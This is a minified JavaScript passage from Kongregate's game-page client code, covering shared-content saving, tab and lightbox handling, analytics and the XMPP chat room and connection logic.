Effect.Highlight("signup_tab_pane",{startcolor:"#ffff99",endcolor:"#dddddd",restorecolor:"#dddddd"}))},closeSignupTab:function(e){this._tabs.closeSignupTab(e)},closeSigninTab:function(e){this._tabs.closeSigninTab(e)},addSignupTabOnCloseCallback:function(e){this._tabs.addOnCloseCallback("signup_tab_pane",e)},isShowingSignupTab:function(){return $("signup_tab_pane").visible()},_purgeTabCookies:function(){Cookie.erase("kong_opened_panel"),Cookie.erase(Holodeck.HOLODECK_TAB_COOKIE_NAME),Cookie.erase("holodeck_tab_override")},loadCollaborators:function(){new Ajax.Request(this._game_path+"/collaborations.js",{method:"get",onSuccess:function(e){var t=$("collaborators_placeholder");t&&t.update(e.responseText)}})},sharedContentData:function(){if(this._shared_content_data)return this._shared_content_data.content},promptSaveSharedContent:function(e){this._permissions.save_shared_content?this.authenticated()?(this._shared_content_data=e,delete(e=Object.extend({},e)).content,this._lightbox.reloadInfoFromUrl(this._active_user.gameResourcePath()+"/shared_contents/new?"+Object.toQueryString(e),"kred_purchase")):(this._shared_content_data=e,this._lightbox.wait_for_shutdown=!0,this._lightbox.reloadInfoFromUrl(this._login_url,"kred_purchase lightbox_login")):this.alertSharedContentSavingNotPermitted(e.contentType)},redoPromptSavedSharedContent:function(){this._shared_content_data&&(this._lightbox.wait_for_shutdown=!1,this._lightbox.reloadInfoFromUrl(this._active_user.gameResourcePath()+"/shared_contents/new?"+Object.toQueryString(this._shared_content_data),"kred_purchase"))},promptProcessingSaveSharedContent:function(e){var t=this;this._lightbox.addOnCloseCallback((function(){t.saveSharedContentFailed()})),this._lightbox.initializeKongregateLightboxFromContent('<p class="shared_content_loading_message">Processing Thumbnail (<a href="#" onclick="holodeck.closeLightbox();return false;">cancel</a>)</p>',{afterStaticContentLoad:function(){$("kongregate_lightbox_spinner").show()}})},saveSharedContentFailed:function(){this.konduit().dispatchEvent({type:KonduitEvent.SAVE_SHARED_CONTENT_COMPLETE,data:{success:!1}}),this._lightbox.deactivate()},saveSharedContentSuccessful:function(e){this._lightbox.clearOnCloseCallbacks(),this.konduit().dispatchEvent({type:KonduitEvent.SAVE_SHARED_CONTENT_COMPLETE,data:{success:!0,content:e.content,name:e.name,permalink:e.permalink,id:e.id,label:e.label}}),e.externally_submitted?this.loadSharedContentWithoutClosingLightbox(e):this.showSharedContent(e.tab_link,e.tab_contents_url)},loadSharedContentWithoutClosingLightbox:function(e){var t=this;this._last_loaded_shared_content_id&&this._last_loaded_shared_content_id==e.id||(this._shared_content_timer&&clearTimeout(this._shared_content_timer),this._last_loaded_shared_content_id=e.id,this._shared_content_timer=setTimeout((function(){t._last_loaded_shared_content_id=null}),5e3),this.konduit().dispatchEvent({type:KonduitEvent.LOAD_SHARED_CONTENT,data:{contentType:e.contentType,content:e.content,name:e.name,permalink:e.permalink,id:e.id,label:e.label}}),this.showSharedContent(e.tab_link,e.tab_contents_url))},loadSharedContent:function(e){this.closeLightbox(),this.loadSharedContentWithoutClosingLightbox(e)},loadSharedContentFromUrl:function(){var e=this,t=document.location.search.parseQuery(),i=this._shared_content_type_permalinks.find((function(e){return t[e]}));i&&new Ajax.Request(this._active_user.gameResourcePath()+"/shared_contents/"+t[i]+".json",{method:"get",onSuccess:function(t){t=t.responseText.evalJSON(),e.loadSharedContent(t)}})},alertSharedContentSavingNotPermitted:function(e){alert(e+" saving is not permitted for this game.")},saveSharedContentFromUrl:function(){if(!this._shared_content_saved_from_url){this._shared_content_saved_from_url=!0;var e=document.location.search.parseQuery();e.type&&(this._permissions.save_shared_content?this._permissions.save_external_shared_content?this._shared_content_type_names.include(e.type.toLowerCase())&&e.content&&/&z$/.match(document.location.href)?this.promptSaveSharedContent({contentType:e.type,label:e.label,content:e.content,fromUrl:!0}):alert("This "+e.type+" could not be saved."):alert(e.type+" saving is only enabled on Kongregate.com."):this.alertSharedContentSavingNotPermitted(e.type))}},showSharedContent:function(e,t){var i=(e+="_pane")+"_spinner",n=$("shared_content_tab_content"),s=$(i);s&&s.show(),n&&n.remove(),this._tabs.ajaxUpdateTab(e,t,(function(){s&&s.hide(),(n=$("shared_content_tab_content"))&&n.select(".collapsible_panel").each((function(e){new CollapsiblePanel(e)}))})),this._tabs.show(e),Element.scrollTo("maingame")},showSharedContentsIndex:function(e,t,i){this._permissions.save_shared_content&&(e=this._active_user.gameResourcePath()+"/shared/"+encodeURIComponent(e)+(t?"?"+Object.toQueryString({sort:t,label:i}):""),!this.authenticated()&&t&&this._authenticated_only_shared_content_sorts.include(t.toLowerCase())?(this._show_shared_contents_index_url=e,this._lightbox.wait_for_shutdown=!0,this.showLightbox(this._login_url)):this.showLightbox(e))},redoShowSharedContentsIndex:function(){this._show_shared_contents_index_url&&this._lightbox.reloadInfoFromUrlFromUrl(this._show_shared_contents_index_url)},updateSharedContentsIndex:function(e){new Ajax.Updater({success:"lightbox_form"},e,{asynchronous:!0,evalScripts:!0,method:"get",onLoading:function(e){Element.show("shared_content_sorting_indicator")}})},showLightbox:function(e){this._lightbox.initializeKongregateLightboxFromAjax(e)},closeLightbox:function(){this._lightbox&&this._lightbox.deactivate()},recordGuestCompletion:function(e){this.authenticated()||this._accomplishment_tracker.recordGuestAccomplishment(e)},loadAdminControls:function(){this._active_user.isAdmin()&&new Ajax.Updater({success:"admin_control_container"},this._active_user.gameResourcePath()+"/admin_controls",{method:"get"})},loadDeveloperControls:function(){active_user.animationThrowdownSteam()||this._active_user.isDeveloperOfGame()&&!this._active_user.isAdmin()&&new Ajax.Updater({success:"developer_control_container"},this._active_user.gameResourcePath()+"/developer_controls",{method:"get"})},loadDiscussions:function(){this._game_discussions.loadDiscussions()},loadRateThisGameTab:function(e){var t=new UserActionCounter({username:this._active_user.username(),counterName:"rate_this_game_closure_user_action_counter"});this.userRating()||$j(document.activeElement).hasClass("chat_input")||($("rate_this_game_tab").show(),0>=this.userRating()&&$$(".rate_this_game_tab_unrated").invoke("show"),this._tabs.showOnTop("rate_this_game_tab_pane"),3<=e&&($j("#rate_this_game_tab_pane_content div#opt_out").show(),$j("#rate_this_game_tab_pane_content div#opt_out input#rate_game_opt_out").change((function(){var e="/accounts/"+holodeck._active_user.username()+"/user_preferences";$j(this).is(":checked")?$j.csrfPost({url:e,data:{preference:"hide_rate_this_game_tab"}}):$j.csrfDelete({url:e+"/1",data:{preference:"hide_rate_this_game_tab"}})}))),$j(".rate_later_link").click((function(e){e.preventDefault(),holodeck.closeRateThisGameTab(),holodeck.trackRateThisGameTabClosure(t)})),$j("li.tab#rate_this_game_tab span.close_tab_link").click((function(){holodeck.trackRateThisGameTabClosure(t)})))},trackRateThisGameTabClosure:function(e){e.increment((function(){}))},closeRateThisGameTab:function(){this._tabs.close("rate_this_game_tab_pane")},hasSharedContent:function(){return this._shared_content_type_names&&this._shared_content_type_names.length},showPlayLaterLinks:function(){$("quicklinks_play_later_block").show(),$("below_game_play_later_block").show()},showStickerPackLink:function(){$("quicklinks_sticker_pack").show()},addUserStickerPack:function(e){this._sticker_manager.pushNewUserStickerPack(e)},addIncomingMessageFilter:function(e){this._incoming_message_filters.unshift(e)},filterIncomingMessage:function(e,t){this.filterMessage(e,this._incoming_message_filters,t)},addOutgoingMessageFilter:function(e){this._outgoing_message_filters.unshift(e)},filterOutgoingMessage:function(e,t){this.filterMessage(e,this._outgoing_message_filters,t)},filterMessage:function(e,t,i){t.inject(i,(function(e,t){return function(i){t(i,e)}}))(e)},addMessageFilters:function(){if(this._active_user){var e=this._active_user.domain().gsub(".","\\."),t=new RegExp("\\b((?:https?://)?www\\."+e+'(?:/[^\\s"]*)*\\b/?)',"i"),i=new Element("p");this.addIncomingMessageFilter((function(e,t){i.setText(e),t(i.innerHTML.gsub("\\\\","\\").gsub("<br>",""),t)})),this.addIncomingMessageFilter((function(e,i){i(e.gsub(t,(function(e){return'<a href="'+(0===e[0].indexOf("http")?"":"http://")+e[0]+'" target="_blank">'+e[0]+"</a>"})),i)}))}},resizeGame:function(e,t){function i(e,t,i,n){var s={};$A(["width","minWidth","maxWidth"]).each((function(t){i.hasOwnProperty(t)&&(s[t]=e+i[t]+"px")})),$A(["height","minHeight","maxHeight"]).each((function(e){i.hasOwnProperty(e)&&(s[e]=t+i[e]+"px")})),n.setStyle(s)}var n=this._html_dimensions;e=parseInt(e,10)||0,t=parseInt(t,10)||0,e<n.game_width&&(e=n.game_width),t<n.game_height&&(t=n.game_height);for(var s=(n=[["#maingame",{width:n.divider_width+n.chat_width,height:n.quicklinks_height}],["#maingamecontent",{width:n.divider_width+n.chat_width,height:n.quicklinks_height}],["#flashframecontent",{width:n.divider_width+n.chat_width,height:n.quicklinks_height}],["#gameholder",{width:0}],["#game",{width:0,height:0}],["#gameiframe",{width:0,height:0}],["#chat_container",{height:0}],[".game_avatar_image>img",{maxHeight:-n.avatar_image_gutter_height}],["#kong_game_ui>.tabpane",{height:-n.chat_pane_tab_height}]]).length-1;0<=s;s--)$$(n[s][0]).each(i.curry(e,t,n[s][1]));CinematicMode.refreshCinematicLayout()},updateGameplay:function(e){this._gameplay_id=e},gameplay:function(){return this._gameplay_id},userRating:function(){return this._user_rating},addOnTabSelectCallback:function(e,t){this._tabs.addOnSelectCallback(e,t)},addOnTabLoadCallback:function(e,t){document.observe(e+":loaded",t),this._tabs.activeContainer.id===e&&t()},setupBelowFoldTabs:function(){$$(".game_tab_index").each((function(e){$(e).firstDescendant().addClassName("active")})),$$(".game_tab_group").each((function(e){$(e).firstDescendant().addClassName("active")})),this._game_discussions.setupTabs(),$(document).on("click",".game_tab_link",(function(e){var t=$(e.target||e.srcElement),i=t.readAttribute("href").sub("#","");t.up().siblings().each((function(e){$(e).removeClassName("active")})),t.up().addClassName("active"),$(i).siblings().each((function(e){$(e).removeClassName("active")})),$(i).addClassName("active"),e.stop()}))}},CapturesToInlineRegistration.decorate=function(e){return active_user.capturedSelectorWrapper.bindAsEventListener(active_user,e)},HolodeckEventAnalytics=function(){this.initialize()},HolodeckEventAnalytics.tab_mappings={chat_tab:["TabView","Chat"],game_tab:["TabView","Game"],accomplishments_tab:["TabView","Achievements"],more_games_tab:["TabView","MoreGames"],signup_tab:["TabView","Signup"],game_info_panel:["Game","InfoToggle"],game_description_panel:["Game","DescriptionToggle"],game_instructions_panel:["Game","InstructionsToggle"],game_shared_contents_panel:["Game","SharedContentToggle"],today_high_score_tab:["Achievements","ScoresToday"],weekly_high_score_tab:["Achievements","ScoresLast7"],all_time_high_score_tab:["Achievements","ScoresAllTime"],friends_high_score_tab:["Achievements","ScoresFriends"]},HolodeckEventAnalytics.prototype={initialize:function(){var e=this;["chat_tab","game_tab","accomplishments_tab","more_games_tab","signup_tab"].each((function(t){var i=$(t);i&&i.observe("click",(function(i){e.recordMappedEventAnalytic(t)}))}))},setMetricTracker:function(e){this._metric_tracker=e},recordEvent:function(e,t,i){if(this._metric_tracker){var n=this._metric_tracker;setTimeout((function(){n.trackEvent(e,t,i)}),0)}},recordMappedEventAnalytic:function(e){(e=HolodeckEventAnalytics.tab_mappings[e])&&this.recordEvent(e[0],e[1])}},HolodeckTabs=Class.create(Control.Tabs,{initialize:function(e,t,i){i||(i={}),this._closeableTabs={},this._preservableTabs={},this._closeableTabsStack=[],this._onCloseCallbacks={},this._onSelectCallbacks={},this._onChangeCallback=i.afterChange,this._tabSelector=i.tabSelector||".tab",i.hideFunction=this.hideContainer,i.showFunction=this.showContainer,i.afterChange=function(e){(e=this._onSelectCallbacks[e.id])&&e.each((function(e){e()})),this._onChangeCallback&&this._onChangeCallback()},this._current_top_priority=HolodeckTabs.Priority.ON_TOP,e(t,i),this._holodeck=i.holodeck},addTab:function(e,t){var i=this,n=t.up(this._tabSelector),s=n.hasClassName("closeable"),o=n.hasClassName("preserve");e(t);var a=this.containers.get(t.key);a.closeable=s,a.preservable=o,s&&(this._closeableTabs[t.key]=!0,(n=n.down(".close_tab_link"))&&n.observe("click",(function(e){i.close(t),e.stop()}))),o&&(this._preservableTabs[t.key]=!0)},keyForLink:function(e){if(e||void 0!==e)return"string"==typeof e?this.links.find((function(t){return t.key==e})).key:"number"==typeof e?this.links[e].key:e.key},linkForKey:function(e){return e.key?e:void 0===e.length?this.links[e]:"first"==e?this.links[0]:this.links.find((function(t){return t.key==e}))},tab:function(e){var t=this.keyForLink(e);return(e=this.links.find((function(e){return e.key==t})))?e.up("li"):null},container:function(e){return this.containers.get(this.keyForLink(e))},addOnCloseCallback:function(e,t){var i=this._onCloseCallbacks[e]||[];i.push(t),this._onCloseCallbacks[e]=i},addOnSelectCallback:function(e,t){var i=this._onSelectCallbacks[e]||[];i.push(t),this._onSelectCallbacks[e]=i,this.activeContainer.id==e&&t()},close:function(e,t){var i=this.linkForKey(e);if(e=this._onCloseCallbacks[i.key],this.isCloseable(i))return e&&(delete this._onCloseCallbacks[i.key],e.each((function(e){e(t)}))),this._closeableTabsStack=this._closeableTabsStack.reject((function(e){return e==i})),this._closeableTabsStack.length&&(e=this._closeableTabsStack[this._closeableTabsStack.length-1],this.show(e,e._priority)),this.hide(i),this.updateStackedTab(),!0},closeTab:function(e,t){$(e)&&this.close(e,t)},closeSignupTab:function(e){this.closeTab("signup_tab_pane",e)},closeSigninTab:function(e){this.closeTab("signin_tab_pane",e)},updateStackedTab:function(){(function(){this._closeableTabsStack.each((function(e){e.up("li").removeClassName("stacked")})),1<this._closeableTabsStack.length&&this._closeableTabsStack[0].up("ul").down(".active").up("li").addClassName("stacked")}).bind(this).defer()},hide:function(e,t){var i=this.tab(e),n=this.container(e);i.hide(),n.hide(),this.activeLink!=e||t||(t=this._holodeck.getTabFromCookie(),e.id.startsWith("signup")||t.startsWith("signup")?holodeck.showAccomplishmentsOrMoreGamesTab():this.show(t))},showOnTop:function(e){this.show(e,++this._current_top_priority)},show:function(e,t){var i=this.linkForKey(e);if(e=i,this.isCloseable(i)){for(var n=(e=this._closeableTabsStack.reject((function(e){return e==i}))).length-1;0<=n;n--)i!=e[n]&&this.hide(e[n],!0);i._priority=t||0,e.push(i),this._closeableTabsStack=e.sortBy((function(e){return e._priority})),e=this._closeableTabsStack[this._closeableTabsStack.length-1]}this.updateStackedTab(),t=this.tab(e),n=this.container(e),t&&n&&(t.show(),n.show(),this.setActiveTab(e))},isCloseable:function(e){return this._closeableTabs[this.keyForLink(e)]},ajaxUpdateTab:function(e,t,i,n){var s=this;new Ajax.Request(t,{method:"get",onSuccess:function(t){var o=s.container(e);n&&(o=o.down(n)),o.update(t.responseText),i&&i()},onFailure:function(t){s.close(e)}})},showAlert:function(e){this._alert_tab_pane_content||(this._alert_tab_pane_content=$("alert_tab_pane_content")),alert_div=$(e),this._alert_tab_pane_content.innerHTML=alert_div.innerHTML,e.startsWith("session_")&&($("session_conflict_content_for_chat_tab").innerHTML=alert_div.innerHTML),this.show("alert_tab_pane",HolodeckTabs.Priority.ERROR)},hideContainer:function(e){e.preservable?(e.setStyle({visibility:"hidden"}),e.select(".hideable").each((function(e){e.setStyle({visibility:"hidden"})}))):e.hide()},showContainer:function(e){e.preservable?(e.setStyle({visibility:"visible"}),e.select(".hideable").each((function(e){e.setStyle({visibility:"visible"})}))):e.show()}}),HolodeckTabs.Priority={ERROR:1,ON_TOP:2,CLOUD_SAVES:100},IntervalManager=function(e,t,i){this.initialize(e,t,i)},IntervalManager.prototype={initialize:function(e,t,i){this._func=e,this._interval=t,this._deadline=i},start:function(e){this._timeout||(e&&this._func(),this._createTimeout())},stop:function(){clearTimeout(this._timeout),this._timeout=null},_createTimeout:function(){var e,t=this;this._deadline&&(e=Date.now()+t._deadline),this._timeout=setTimeout((function(){(!e||Date.now()<e)&&t._func(),t._createTimeout()}),this._interval)}},JabberChatRoom.TIME_FORMAT="YYYYMMDDTHH:mm:ss",JabberChatRoom.USER_VAR_KEYS="username type level chat_avatar_url game_title game_url moderator_room_ids moderator_game_ids".split(" "),JabberChatRoom.prototype={initialize:function(e){this._messageFilter=e.messageFilter||new MessageFilter,this._connection=e.connection,this._activeUser=e.activeUser,this._muc=this._connection._client.muc,this._type=e.type,this._name=e.name,this._xmppName=e.xmppName,this._gameId=e.gameId||null,this.reset(),this._rateLimiters={},this._retryAttempts=0},join:function(){if(this._connection.connected()){var e=Kongregate.Utils.catchErrors,t=$build("status",JSON.stringify(this._userStatus())).node;this.muc().join(this.jid(),this.userNickname(),e(this._onRoomMessage,this,!0),e(this._onRoomPresence,this,!0),e(this._onRoomRoster,this,!0),null,{seconds:60},t)}},leave:function(e){!e&&this._joined&&this._connection.connected()&&this.muc().leave(this.jid(),this.userNickname(),null,""),this._onRoomLeave()},sendGroupMessage:function(e){if(this._connection.connected())if("string"==typeof e)this.muc().groupchat(this.jid(),e);else if(e.stickerId){var t=":sticker-"+e.stickerId+"-"+e.stickerVariant+":";this.muc().groupchat(this.jid(),t,JSON.stringify(e))}},xmppName:function(){return this._xmppName},reset:function(){this._occupants={},this._joined=!1},jid:function(){return this.xmppName()+"@conference."+this._connection.serverName()},userNickname:function(){return this._activeUser.chatUsername()},isMyPrivateRoom:function(){var e=JabberConnection.PRIVATE_ROOM_PREFIX+this.userNickname().toLowerCase();return"private"===this._type&&this._xmppName==e},userJid:function(){return this.jid()+"/"+this.userNickname()},muc:function(){return this._connection._client.muc},toObject:function(){return{xmpp_name:this._xmppName,id:this._xmppName,name:this._name,type:this._type,game_id:this._gameId}},_dispatchEvent:function(e,t){this._connection.trigger(e,t)},_userStatus:function(){return[this._activeUser.userVarsSig(),this._activeUser.userVars(),{special_chat_vars:JSON.stringify(this._activeUser.specialChatVars())}]},_parsePresence:function(e){return XmppRoom._parsePresence(e)},_parseMessage:function(e){var t={history:!1,timestamp:null};return t.nick=Strophe.getResourceFromJid(e.getAttribute("from")),$j.map(e.childNodes,(function(e){switch(e.nodeName){case"body":t.body=e.textContent||e.text;break;case"html":if(!e.childNodes.length)break;e=e.childNodes[0],t.payload=JSON.parse(e.textContent||e.text);break;case"subject":t.subject=e.textContent||e.text;break;case"x":"jabber:x:delay"===e.getAttribute("xmlns")&&(t.history=!0,e=e.getAttribute("stamp"),t.timestamp=moment.utc(e,JabberChatRoom.TIME_FORMAT).valueOf())}})),t},_onRoomMessage:function(e,t){var i=(t=this._parseMessage(e)).nick,n=this._occupants[i];return Kongregate.Log.debug("RoomMessage",t,e),!t.history&&this._checkRateLimitViolation(t.nick)||(t.subject?void 0!==(e=JSON.parse(t.subject).g)&&this._dispatchEvent(KonduitEvent.GUEST_COUNT,{room:this.toObject(),guests:e}):n&&this._dispatchEvent(KonduitEvent.ROOM_MESSAGE,{user:{username:i,variables:n},room:this.toObject(),message:t.payload||this._filterMessage(t.body),history:t.history,timestamp:t.timestamp||null})),!0},_checkRateLimitViolation:function(e){return void 0===this._rateLimiters[e]&&(this._rateLimiters[e]=new JabberRateLimiter),this._rateLimiters[e].ruleViolated()},_filterMessage:function(e){return this._messageFilter.filterMessage(e)},_deleteMucRoom:function(){var e=this.muc();if(e&&e.rooms&&e.roomNames){delete e.rooms[this.jid()];var t=e.roomNames.indexOf(this.jid());0<=t&&e.roomNames.splice(t,1)}},_onRoomPresence:function(e,t){var i=this._parsePresence(e);if("error"===i.type)return this._onRoomError(i),!0;t=i.nick||"";var n=this._createUserPayload(i),s={user:n,room:this.toObject()};return Kongregate.Log.debug("RoomPresence",i,n),"unavailable"===i.type?(delete this._occupants[t],this._dispatchEvent(KonduitEvent.USER_DEPARTURE,s),t.toLowerCase()===this.userNickname().toLowerCase()&&this._onUserKicked(i)):n.variables.valid?(e=!!this._occupants[t],this._occupants[t]=n.variables,this._dispatchEvent(e?KonduitEvent.USER_CHANGED:KonduitEvent.USER_JOIN,s)):0!==t.toLowerCase().indexOf("guest")&&Kongregate.Log.error("Invalid user ignored: "+t,e,i),!0},_onRoomRoster:function(e,t){this.reset(),this._joined=!0,this._dispatchEvent(KonduitEvent.JOIN_ROOM,{room:this.toObject()})},_onRoomLeave:function(e){this._joined&&(e=e||{kicked:!1,owner_destroyed:!1,owner_left:!1},e=$j.extend({room:this.toObject()},e),this.reset(),this._dispatchEvent(KonduitEvent.LEAVE_ROOM,e),this._deleteMucRoom())},_onUserKicked:function(e){var t=!1,i=this;$j.each(e.states,(function(e,n){if("321"===n)t=!0;else if("307"===n)return Kongregate.Log.info("Kicked from room due to premium-only"),i._onRoomLeave(),i._onRoomError({errorcode:"404"})})),"private"===this._type&&(this.isMyPrivateRoom()?this._onRoomLeave():(e={kicked:t,owner_left:!t,owner_destroyed:!1},Kongregate.Log.info("Kicked from room",e),this._onRoomLeave(e)))},_onRoomError:function(e){switch(Kongregate.Log.error("Room error",e),e.errorcode){case"407":case"405":this._onRoomNotFound();break;case"503":this._onRoomFull();break;case"404":this._onRoomLocked();break;default:Kongregate.Log.warn("Unknown room error, treating as not found"),this._onRoomNotFound()}},_onRoomNotFound:function(){this._dispatchEvent(KonduitEvent.ROOM_NOT_FOUND,{room:this.toObject()})},_onRoomFull:function(){this._dispatchEvent(KonduitEvent.ROOM_FULL,{room:this.toObject()})},_onRoomLocked:function(){if(Kongregate.Log.warn("Room is locked",this.toObject()),"game"===this._type)Kongregate.Log.warn("Requested game room is locked, requesting another"),this._connection.joinRoom({type:"game"});else if("chat"===this._type)if(Kongregate.Log.warn("Requested chat room is locked, requesting another"),0>this._retryAttempts++)this._dispatchEvent(KonduitEvent.REQUEST_CHAT_ROOM,{room:this.toObject()});else{Kongregate.Log.warn("Too many retries");var e=this.toObject();e.lockedRetries=!0,this._dispatchEvent(KonduitEvent.ROOM_NOT_FOUND,{room:e})}else Kongregate.Log.error("Unknown locked room type: "+this._type)},_createUserPayload:function(e){var t=e.nick,i=e.status||!this._occupants[t]?this._parseUserVariables(t,e.status):this._occupants[t];return(i={username:t,variables:i}).variables.username=e.nick,i.variables.role=e.role,i.variables.presence=e.show,i},_parseUserVariables:function(e,t){try{t=(JSON.parse(t)||[]).slice()}catch(i){Kongregate.Log.error("Error while parsing user variables for "+e+" - "+i.message,t),t=[]}var i=t[1]||[];if("string"==typeof i)try{i=JSON.parse(i)}catch(t){Kongregate.Log.error("Error while parsing variables array for"+e+" - "+t.message,i),i=[]}var n={special_chat_vars:(t[2]||{}).special_chat_vars};return $j.map(JabberChatRoom.USER_VAR_KEYS,(function(e,t){n[e]=i[t]})),t=n.type||"",n.developer=0<=t.indexOf("d"),n.admin=0<=t.indexOf("a"),n.moderator=0<=t.indexOf("m"),n.curator=0<=t.indexOf("c"),n.premium=0<=t.indexOf("p"),n.chat_avatar_url=this._parseAvatarUrl(n.chat_avatar_url),n.valid=this._validateUserVariables(e,i,n),n},_validateUserVariables:function(e,t,i){return e!==i.username?(Kongregate.Log.error("Username mismatch for "+e+" != "+i.username),!1):t.length!==JabberChatRoom.USER_VAR_KEYS.length?(Kongregate.Log.error("Invalid user variables array length: "+t.length),!1):"number"!=typeof i.level||1>i.level||75<i.level?(Kongregate.Log.error("Invalid level: "+i.level),!1):(e=/<.+?>/).test(i.chat_avatar_url)||e.test(i.game_url)||e.test(i.game_title)?(Kongregate.Log.error("Invalid tag found in user data"),!1):!(e=/['" ]+/).test(i.chat_avatar_url)&&!e.test(i.game_url)||(Kongregate.Log.error("Invalid avatar or game url"),!1)},_parseAvatarUrl:function(e){return e&&0!==e.indexOf("http")&&0<e.indexOf(":")?"https://"+(e=e.split(":")).shift()+"."+this._activeUser.bareCDNhost()+e.join(":"):e}},$j.extend(JabberChatRoom.prototype,Evented),function(){JabberConnection.CONNECTION_MONITOR_INTERVAL=1e4,JabberConnection.WEBSOCKET_PING_INTERVAL=3e4,JabberConnection.PING_INTERVAL=6e4,JabberConnection.IDLE_INCOMING_TIMEOUT=2.1*JabberConnection.PING_INTERVAL,JabberConnection.RECONNECT_INTERVAL=1e4,JabberConnection.MAX_RECONNECT_INTERVAL=3e4,JabberConnection.MAX_BOSH_CONNECTION_ATTEMPTS=1,JabberConnection.RELIABLE_WEBSOCKET_CONNECTION_ATTEMPTS=10,JabberConnection.UNRELIABLE_WEBSOCKET_CONNECTION_ATTEMPTS=4,JabberConnection.WEBSOCKET_CONNECTION_DURATION=3e4,JabberConnection.SET_PRESENCE_INTERVAL=3e3,JabberConnection.KONGREGATE_IQ_NAMESPACE="kongregate:iq:msg",JabberConnection.KONGREGATE_MESSAGE_EVENT="kongregate_message",JabberConnection.PRIVATE_ROOM_PREFIX="kpr-",JabberConnection.OP_REQUEST_GAME_ROOM="room.rq",JabberConnection.OP_PRIVATE_MESSAGE="chat.pm",JabberConnection.OP_STATS_SUBMIT="stat.submit",JabberConnection.OP_SET_PRESENCE="set_presence",JabberConnection.OP_CREATE_PRIVATE_ROOM="room.create",JabberConnection.OP_DESTROY_PRIVATE_ROOM="room.destroy",JabberConnection.OP_PRIVATE_ROOM_INVITE="room.invite.private",JabberConnection.OP_PRIVATE_ROOM_KICK="room.kick.private",JabberConnection.OP_SILENCED="silenced",JabberConnection.OP_PARTICIPATE="participate";var e=Kongregate.Utils.catchErrors;Strophe.log=function(e,t){try{Kongregate.Log.debug("Strophe["+e+"]: "+t)}catch(e){}},JabberConnection.prototype={initialize:function(e){var t=this;this._setupWsPolyfill(e),this._messageFilter=e.messageFilter||new MessageFilter,this._wsEndpoint=e.wsEndpoint?e.wsEndpoint.replace(/\/?$/,"/"):null,this._boshEndpoint=e.boshEndpoint?e.boshEndpoint.replace(/\/?$/,"/"):null,this._host=e.host,this._activeUser=e.activeUser,this._rooms={},this._traceXmpp=e.traceXmpp,this._presence={},this._webSocketsSuccessful=this._webSocketsReliable=!1,this._forceBosh=this._boshEndpoint&&!this.webSocketsEnabled(),this._connectionAttempts=0,this._numConnections={websocket:0,bosh:0},this._stanzasSent=this._stanzasReceived=this._numTimeouts=0,this._sessionId=uuid.v4(),this._patchStrophe(),this._createClient(),this._messageFilter.on(KonduitEvent.MESSAGE_ERROR,(function(e){t._onFilterError(e)})),this._rateLimiter=new JabberRateLimiter},shutdown:function(){this._stopConnectionMonitor(),clearTimeout(this._reconnectTimeout)},connect:function(){if(!this.connected()){this._shouldSwitchConnectionType()?this._switchConnectionType():this._invalidSession?(Kongregate.Log.debug("Creating new client due to invalid session"),this._createClient()):this._resetClient();var t=this.myNode()+"@"+this._host+"/xiff",i=JSON.stringify({k:this._activeUser.chatPassword()});this._client.connect(t,i,e(this._onConnectionStatus,this,!0)),this._connectionAttempts+=1,Kongregate.Log.info("Chat connection attempt #"+this._connectionAttempts+" type="+this.connectionType())}},disconnect:function(){this.connected()&&this._client.disconnect()},switchUser:function(){Kongregate.Log.debug("Switching user to: "+this._activeUser.chatUsername()),this.disconnect(),this.connect()},sendGroupMessage:function(e,t){this._validate()&&(t=this._filterMessage(t),(e=this.room(e))&&e.sendGroupMessage(t))},sendPrivateMessage:function(e,t){this._validate()&&(t=this._filterMessage(t),Kongregate.Log.debug("Sending private message to "+e+", msg: "+t),this.sendKongregateMessage(JabberConnection.OP_PRIVATE_MESSAGE,{from:this._activeUser.chatUsername(),to:e,data:t}))},inviteUserToPrivateRoom:function(e){this._validate()&&(Kongregate.Log.info("Inviting user "+e+" to my private room"),this.sendKongregateMessage(JabberConnection.OP_PRIVATE_ROOM_INVITE,{from:this._activeUser.chatUsername(),to:e}))},destroyPrivateRoom:function(){this.sendKongregateMessage(JabberConnection.OP_DESTROY_PRIVATE_ROOM,{})},kickUserFromPrivateRoom:function(e){Kongregate.Log.info("Kicking user "+e+" from my private room"),this.sendKongregateMessage(JabberConnection.OP_PRIVATE_ROOM_KICK,{user:e})},flushStatistics:function(e){this.connected()&&(e.game_id=this._activeUser.gameId(),this.sendKongregateMessage(JabberConnection.OP_STATS_SUBMIT,e))},room:function(e){return this._rooms[e]},joinRoom:function(e){if("game"!==e.type||this._validateGameRoom(e)){if("private"===e.type){if(!this._validatePrivateRoom(e))return;var t=this._rooms.private,i=JabberConnection.PRIVATE_ROOM_PREFIX+this.myNode();t&&t.xmpp_name===i&&this.destroyPrivateRoom()}this.leaveRoom(e.type),t=this._createRoom(e),this._rooms[e.type]=t,t.join()}},leaveRoom:function(e){var t=this.room(e);t&&(t.leave(),delete this._rooms[e])},connected:function(){return this._client.connected},host:function(){return this._host},supportsWebSockets:function(){return void 0!==window.WebSocket},webSocketsEnabled:function(){return!this._boshEndpoint||this.supportsWebSockets()&&this._activeUser.webSocketsEnabled()},webSocketEndpoint:function(){return this._wsEndpoint},boshEndpoint:function(){return this._boshEndpoint},connectionEndpoint:function(){return(this._forceBosh?this.boshEndpoint():this.webSocketsEnabled()?this.webSocketEndpoint():this.boshEndpoint())+"?"+this._connectionQueryString()},connectionType:function(){return 0===this.connectionEndpoint().indexOf("ws")?"websocket":"bosh"},jid:function(){return this._client.jid},myNode:function(){return this._activeUser.chatUsername().toLowerCase()},serverName:function(){return this.jid().split("@")[1].split("/")[0]},sendKongregateMessage:function(e,t){e=this._buildKongregateIQ(e,t).tree(),this._client.send(e)},_patchStrophe:function(){if("undefined"!=typeof Strophe){Kongregate.Log.debug("Patching BOSH error handler");var e=Strophe.Bosh.prototype._hitError;Strophe.Bosh.prototype._hitError=function(t){e.bind(this)(t),3<=this.errors&&this._conn._onDisconnectTimeout()}}},_connectionQueryString:function(){var e={sid:this._sessionId,svid:this._activeUser.siteVisitorUID(),wsr:this._webSocketsReliable,wss:this._webSocketsSuccessful,ca:this._connectionAttempts,wc:this._numConnections.websocket,bc:this._numConnections.bosh,tc:this._numTimeouts,sr:this._stanzasReceived,ss:this._stanzasSent,pb:!0};return Object.toQueryString(e)},_setupWsPolyfill:function(e){if(WebSocket&&"function"==typeof WebSocket.loadFlashPolicyFile){-1!==e.wsEndpoint.indexOf("chat-proxy")&&(e.wsEndpoint=e.wsEndpoint.replace("chat-proxy","chat-proxy-flash"),Kongregate.Log.debug("Using 